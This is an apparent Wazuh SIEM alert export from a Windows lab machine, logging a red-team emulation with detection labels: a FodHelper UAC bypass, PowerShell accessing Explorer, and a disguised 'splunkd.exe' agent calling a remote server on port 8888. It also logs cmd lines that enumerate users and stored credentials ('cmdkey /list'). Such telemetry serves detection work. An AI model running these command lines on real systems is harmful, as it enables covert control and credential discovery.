wazuh-alerts-4.x-2024.12.10,OcddsZMBnOFSf1lyMEe0,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1548.002,technique_name=Bypass User Access Control
UtcTime: 2024-12-10 16:18:12.225
ProcessGuid: {15959494-69c4-6758-ad03-000000000200}
ProcessId: 4948
Image: C:\Windows\System32\fodhelper.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Features On Demand Helper
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: FodHelper.EXE
CommandLine: C:\WINDOWS\System32\FodHelper.exe -Embedding
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-50d3-6758-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=26D7407931B713E0F0FA8B872FEECDB3CF49065A,MD5=85018BE1FD913656BC9FF541F017EACD,SHA256=C546E05D705FFDD5E1E18D40E2E7397F186A7C47FA5FC21F234222D057227CF5,IMPHASH=2BD851C90720C3E5FEE7E3FF3ACFA3D5
ParentProcessGuid: {15959494-50d3-6758-0d00-000000000200}
ParentProcessId: 840
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\WINDOWS\system32\svchost.exe -k DcomLaunch -p
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-12-10T16:18:12.2411338Z,6060,3480,DESKTOP-QGB4EQH,1,2452,INFORMATION,Microsoft-Windows-Sysmon,1,TRUE,12,Known auto-elevated utility FodHelper.EXE may have been used to bypass UAC,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92055,windows_eventchannel,log,"Dec 10, 2024 @ 16:18:13.374",EventChannel,1733847493,"Dec 10, 2024 @ 16:18:13.374", , , , , ,FodHelper.EXE,C:\\Windows\\System32\\fodhelper.exe,Microsoft® Windows® Operating System, , ,Features On Demand Helper, , ,{15959494-69c4-6758-ad03-000000000200},4948,18:12.2,"SHA1=26D7407931B713E0F0FA8B872FEECDB3CF49065A,MD5=85018BE1FD913656BC9FF541F017EACD,SHA256=C546E05D705FFDD5E1E18D40E2E7397F186A7C47FA5FC21F234222D057227CF5,IMPHASH=2BD851C90720C3E5FEE7E3FF3ACFA3D5","technique_id=T1548.002,technique_name=Bypass User Access Control",Microsoft Corporation,10.0.19041.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM,"[""Bypass User Account Control""]","[""T1548.002""]","[""Privilege Escalation"",""Defense Evasion""]", , , , , , , , , , , ,{15959494-50d3-6758-0d00-000000000200},{15959494-50d3-6758-e703-000000000000},C:\\WINDOWS\\system32\\svchost.exe -k DcomLaunch -p,0x3e7,840,C:\\WINDOWS\\system32\\,C:\\Windows\\System32\\svchost.exe,C:\\WINDOWS\\System32\\FodHelper.exe -Embedding,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,OsddsZMBnOFSf1lyMEe0,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,4624,0x8020000000000000,{54849625-5478-4994-a5ba-3e3b0328c30d},0,Security,0,"""An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DESKTOP-QGB4EQH$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x284
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-12-10T16:18:12.2984712Z,797,5760,DESKTOP-QGB4EQH,12544,672,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,8,FALSE,3,Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,windows_eventchannel,log,"Dec 10, 2024 @ 16:18:13.405",EventChannel,1733847493,"Dec 10, 2024 @ 16:18:13.405", , , ,"[""IV_32.2""]","[""7.1"",""7.2""]", , , , , , , , , ,0x284, , , , , , ,"[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]", , , , , , ,"[""10.2.5""]","[""164.312.b""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AC.7"",""AU.14""]", , ,{00000000-0000-0000-0000-000000000000}, , , , , , , , , ,0x3e7,WORKGROUP,0x0,%%1833,Negotiate,0x3e7,Advapi,SYSTEM,0,%%1842,S-1-5-18,C:\\Windows\\System32\\services.exe,NT AUTHORITY,S-1-5-18,%%1843,5,DESKTOP-QGB4EQH$, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,PsddsZMBnOFSf1lySEcl,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,7040,0x8080000000000000,{555908d1-a6d7-4695-8e1e-26931d2012f4},4,System,0,"""The start type of the Windows Modules Installer service was changed from auto start to demand start.""",0,2024-12-10T16:18:18.9633820Z,396,2588,DESKTOP-QGB4EQH,0,644,INFORMATION,Service Control Manager,2,FALSE,3,Service startup type was changed,"[""windows"",""windows_system"",""policy_changed""]",61104,windows_eventchannel,log,"Dec 10, 2024 @ 16:18:19.770",EventChannel,1733847499,"Dec 10, 2024 @ 16:18:19.770", , ,Service Control Manager,"[""IV_35.7.d""]", , , , , , , , , , , , , , , , , , , , ,Windows Modules Installer, , ,demand start,TrustedInstaller,auto start,"[""10.6""]","[""164.312.b""]","[""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.6""]",This does not appear to be logged on Windows 2000, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,QsddsZMBnOFSf1lyqUfS,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1001,0x80000000000000, ,4,Application,0,"""Fault bucket 1892681873205023132, type 5
Event Name: MoAppCrash
Response: Not available
Cab Id: 0

Problem signature:
P1: Microsoft.WindowsCalculator_10.2103.8.0_x64__8wekyb3d8bbwe
P2: praid:App
P3: 10.2103.8.0
P4: 6062256a
P5: combase.dll
P6: 10.0.19041.4717
P7: e7bf5429
P8: 87b20c08
P9: 000000000009c13a
P10: 

Attached files:
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WERF7A6.tmp.mdmp
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WERF892.tmp.WERInternalMetadata.xml
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WERF8D1.tmp.xml
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WERF8DF.tmp.csv
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WERF8FF.tmp.txt

These files may be available here:
\\?\C:\ProgramData\Microsoft\Windows\WER\ReportArchive\AppCrash_Microsoft.Window_a9c0f392a2d691d1ac16022212f57254818d6_45c74590_0cd3e4a3-2f83-4fd7-a97e-592f1ae8d2b5

Analysis symbol: 
Rechecking for solution: 0
Report Id: 2e07be5f-c951-410d-9bc9-c84b0fb21d73
Report Status: 268435456
Hashed bucket: 1426b0d26aae027fea442822c534d19c
Cab Guid: 0""",0,2024-12-10T16:18:43.0129612Z,298,0,DESKTOP-QGB4EQH,0,0,INFORMATION,Windows Error Reporting,1,FALSE,4,Summary event of the report's signatures.,"[""windows"",""windows_application""]",60608,windows_eventchannel,log,"Dec 10, 2024 @ 16:18:43.060",EventChannel,1733847523,"Dec 10, 2024 @ 16:18:43.060","1892681873205023132, 5, MoAppCrash, Not available, 0, Microsoft.WindowsCalculator_10.2103.8.0_x64__8wekyb3d8bbwe, praid:App, 10.2103.8.0, 6062256a, combase.dll, 10.0.19041.4717, e7bf5429, 87b20c08, 000000000009c13a,   \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERF7A6.tmp.mdmp  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERF892.tmp.WERInternalMetadata.xml  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERF8D1.tmp.xml  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERF8DF.tmp.csv  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERF8FF.tmp.txt, \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\AppCrash_Microsoft.Window_a9c0f392a2d691d1ac16022212f57254818d6_45c74590_0cd3e4a3-2f83-4fd7-a97e-592f1ae8d2b5, 0, 2e07be5f-c951-410d-9bc9-c84b0fb21d73, 268435456, 1426b0d26aae027fea442822c534d19c, 0", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,RcdesZMBnOFSf1lyMkeP,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,7040,0x8080000000000000,{555908d1-a6d7-4695-8e1e-26931d2012f4},4,System,0,"""The start type of the Background Intelligent Transfer Service service was changed from demand start to auto start.""",0,2024-12-10T16:19:12.9005323Z,400,2588,DESKTOP-QGB4EQH,0,644,INFORMATION,Service Control Manager,3,FALSE,3,Service startup type was changed,"[""windows"",""windows_system"",""policy_changed""]",61104,windows_eventchannel,log,"Dec 10, 2024 @ 16:19:13.960",EventChannel,1733847553,"Dec 10, 2024 @ 16:19:13.960", , ,Service Control Manager,"[""IV_35.7.d""]", , , , , , , , , , , , , , , , , , , , ,Background Intelligent Transfer Service, , ,auto start,BITS,demand start,"[""10.6""]","[""164.312.b""]","[""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.6""]",This does not appear to be logged on Windows 2000, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,SsdesZMBnOFSf1ly4kdb,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,10,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2024-12-10 16:19:59.687
SourceProcessGUID: {15959494-69d4-6758-c903-000000000200}
SourceProcessId: 9796
SourceThreadId: 10080
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {15959494-518d-6758-0d01-000000000200}
TargetProcessId: 3652
TargetImage: C:\WINDOWS\Explorer.EXE
GrantedAccess: 0x1410
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+9d9b4|C:\WINDOWS\System32\KERNELBASE.dll+338ae|C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System\808887ebadf1a37835b907c866cede3c\System.ni.dll+382b10|C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System\808887ebadf1a37835b907c866cede3c\System.ni.dll+33842e|C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System\808887ebadf1a37835b907c866cede3c\System.ni.dll+33786f|C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System\808887ebadf1a37835b907c866cede3c\System.ni.dll+2b92a5|C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System\808887ebadf1a37835b907c866cede3c\System.ni.dll+2c5064|UNKNOWN(00007FFC04BB3DA1)
SourceUser: DESKTOP-QGB4EQH\mari
TargetUser: DESKTOP-QGB4EQH\mari""",3,2024-12-10T16:19:59.7024200Z,6233,3480,DESKTOP-QGB4EQH,10,2452,INFORMATION,Microsoft-Windows-Sysmon,4,TRUE,12,"Explorer process was accessed by C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, possible process injection","[""sysmon"",""sysmon_eid10_detections"",""windows""]",92910,windows_eventchannel,log,"Dec 10, 2024 @ 16:20:00.763",EventChannel,1733847600,"Dec 10, 2024 @ 16:20:00.763", , , , , , , , , , , , , , , ,19:59.7, ,"technique_id=T1055.001,technique_name=Dynamic-link Library Injection", , , ,"[""Process Injection""]","[""T1055""]","[""Defense Evasion"",""Privilege Escalation""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,0x1410,3652,DESKTOP-QGB4EQH\\mari,C:\\WINDOWS\\Explorer.EXE,{15959494-69d4-6758-c903-000000000200},C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9d9b4|C:\\WINDOWS\\System32\\KERNELBASE.dll+338ae|C:\\WINDOWS\\assembly\\NativeImages_v4.0.30319_64\\System\\808887ebadf1a37835b907c866cede3c\\System.ni.dll+382b10|C:\\WINDOWS\\assembly\\NativeImages_v4.0.30319_64\\System\\808887ebadf1a37835b907c866cede3c\\System.ni.dll+33842e|C:\\WINDOWS\\assembly\\NativeImages_v4.0.30319_64\\System\\808887ebadf1a37835b907c866cede3c\\System.ni.dll+33786f|C:\\WINDOWS\\assembly\\NativeImages_v4.0.30319_64\\System\\808887ebadf1a37835b907c866cede3c\\System.ni.dll+2b92a5|C:\\WINDOWS\\assembly\\NativeImages_v4.0.30319_64\\System\\808887ebadf1a37835b907c866cede3c\\System.ni.dll+2c5064|UNKNOWN(00007FFC04BB3DA1),10080,{15959494-518d-6758-0d01-000000000200},9796,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,UMdfsZMBnOFSf1lyNEdq,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,7,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-12-10 16:20:21.935
ProcessGuid: {15959494-6a26-6758-ec03-000000000200}
ProcessId: 10168
Image: C:\Windows\System32\sppsvc.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\NETWORK SERVICE""",3,2024-12-10T16:20:21.9469379Z,6317,3480,DESKTOP-QGB4EQH,7,2452,INFORMATION,Microsoft-Windows-Sysmon,11,FALSE,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154,windows_eventchannel,log,"Dec 10, 2024 @ 16:20:22.992",EventChannel,1733847622,"Dec 10, 2024 @ 16:20:22.992", , , , , ,taskschd.dll,C:\\Windows\\System32\\sppsvc.exe,Microsoft® Windows® Operating System,Microsoft Windows,C:\\Windows\\System32\\taskschd.dll,Task Scheduler COM API,TRUE,Valid,{15959494-6a26-6758-ec03-000000000200},10168,20:21.9,"SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B","technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation,10.0.19041.3636 (WinBuild.160101.0800),NT AUTHORITY\\NETWORK SERVICE,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,U8dgsZMBnOFSf1lybEfs,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,10,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2024-12-10 16:21:38.799
SourceProcessGUID: {15959494-69d4-6758-c903-000000000200}
SourceProcessId: 9796
SourceThreadId: 10080
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {15959494-518d-6758-0d01-000000000200}
TargetProcessId: 3652
TargetImage: C:\WINDOWS\Explorer.EXE
GrantedAccess: 0x1410
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+9d9b4|C:\WINDOWS\System32\KERNELBASE.dll+338ae|C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System\808887ebadf1a37835b907c866cede3c\System.ni.dll+382b10|C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System\808887ebadf1a37835b907c866cede3c\System.ni.dll+33842e|C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System\808887ebadf1a37835b907c866cede3c\System.ni.dll+33786f|C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System\808887ebadf1a37835b907c866cede3c\System.ni.dll+2b92a5|C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System\808887ebadf1a37835b907c866cede3c\System.ni.dll+2c5064|UNKNOWN(00007FFC04BB3DA1)
SourceUser: DESKTOP-QGB4EQH\mari
TargetUser: DESKTOP-QGB4EQH\mari""",3,2024-12-10T16:21:38.7998751Z,6327,3480,DESKTOP-QGB4EQH,10,2452,INFORMATION,Microsoft-Windows-Sysmon,5,TRUE,12,"Explorer process was accessed by C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, possible process injection","[""sysmon"",""sysmon_eid10_detections"",""windows""]",92910,windows_eventchannel,log,"Dec 10, 2024 @ 16:21:39.853",EventChannel,1733847699,"Dec 10, 2024 @ 16:21:39.853", , , , , , , , , , , , , , , ,21:38.8, ,"technique_id=T1055.001,technique_name=Dynamic-link Library Injection", , , ,"[""Process Injection""]","[""T1055""]","[""Defense Evasion"",""Privilege Escalation""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,0x1410,3652,DESKTOP-QGB4EQH\\mari,C:\\WINDOWS\\Explorer.EXE,{15959494-69d4-6758-c903-000000000200},C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9d9b4|C:\\WINDOWS\\System32\\KERNELBASE.dll+338ae|C:\\WINDOWS\\assembly\\NativeImages_v4.0.30319_64\\System\\808887ebadf1a37835b907c866cede3c\\System.ni.dll+382b10|C:\\WINDOWS\\assembly\\NativeImages_v4.0.30319_64\\System\\808887ebadf1a37835b907c866cede3c\\System.ni.dll+33842e|C:\\WINDOWS\\assembly\\NativeImages_v4.0.30319_64\\System\\808887ebadf1a37835b907c866cede3c\\System.ni.dll+33786f|C:\\WINDOWS\\assembly\\NativeImages_v4.0.30319_64\\System\\808887ebadf1a37835b907c866cede3c\\System.ni.dll+2b92a5|C:\\WINDOWS\\assembly\\NativeImages_v4.0.30319_64\\System\\808887ebadf1a37835b907c866cede3c\\System.ni.dll+2c5064|UNKNOWN(00007FFC04BB3DA1),10080,{15959494-518d-6758-0d01-000000000200},9796,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,VsdhsZMBnOFSf1lyU0ds,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-12-10 16:22:34.810
ProcessGuid: {15959494-6aca-6758-0d04-000000000200}
ProcessId: 6892
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C C:\Windows\System32\Curl.exe -s -A ""HttpBrowser/1.0"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""*<|>*"" -m3 www.google.com >nul 2>&1
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-5188-6758-d693-370000000000}
LogonId: 0x3793D6
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-6a99-6758-fe03-000000000200}
ParentProcessId: 9912
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T16:22:34.8169463Z,6409,3480,DESKTOP-QGB4EQH,1,2452,INFORMATION,Microsoft-Windows-Sysmon,1,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 10, 2024 @ 16:22:35.871",EventChannel,1733847755,"Dec 10, 2024 @ 16:22:35.871", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-6aca-6758-0d04-000000000200},6892,22:34.8,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-6a99-6758-fe03-000000000200},{15959494-5188-6758-d693-370000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x3793d6,9912,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C C:\\Windows\\System32\\Curl.exe -s -A \""HttpBrowser/1.0\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""Wget/1.9+cvs-stable (Red Hat modified)\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""Opera/8.81 (Windows NT 6.0; U; en)\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""*&lt;|&gt;*\"" -m3 www.google.com &gt;nul 2&gt;&amp;1",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,XMdisZMBnOFSf1lyKkdN,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-12-10 16:23:36.375
ProcessGuid: {15959494-6b08-6758-1304-000000000200}
ProcessId: 7632
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  user 
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-5188-6758-d693-370000000000}
LogonId: 0x3793D6
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {15959494-6b08-6758-1204-000000000200}
ParentProcessId: 9700
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C net user && dir c:\Users\ && cmdkey.exe /list && net localgroup ""Users"" && net localgroup
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T16:23:36.3770193Z,6423,3480,DESKTOP-QGB4EQH,1,2452,INFORMATION,Microsoft-Windows-Sysmon,1,FALSE,3,A C:\\Windows\\System32\\net.exe binary was started by a Windows cmd shell,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92036,windows_eventchannel,log,"Dec 10, 2024 @ 16:23:37.445",EventChannel,1733847817,"Dec 10, 2024 @ 16:23:37.445", , , , , ,net.exe,C:\\Windows\\System32\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-6b08-6758-1304-000000000200},7632,23:36.4,"SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.19041.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell"",""DLL Search Order Hijacking""]","[""T1059.003"",""T1574.001""]","[""Execution"",""Persistence"",""Privilege Escalation"",""Defense Evasion""]", , , , , , , , , , , ,{15959494-6b08-6758-1204-000000000200},{15959494-5188-6758-d693-370000000000},"cmd.exe /C net user &amp;&amp; dir c:\\Users\\ &amp;&amp; cmdkey.exe /list &amp;&amp; net localgroup \""Users\"" &amp;&amp; net localgroup",0x3793d6,9700,C:\\Users\\mari\\,C:\\Windows\\System32\\cmd.exe,net  user,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,YcdisZMBnOFSf1lyKkdN,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-12-10 16:23:36.460
ProcessGuid: {15959494-6b08-6758-1804-000000000200}
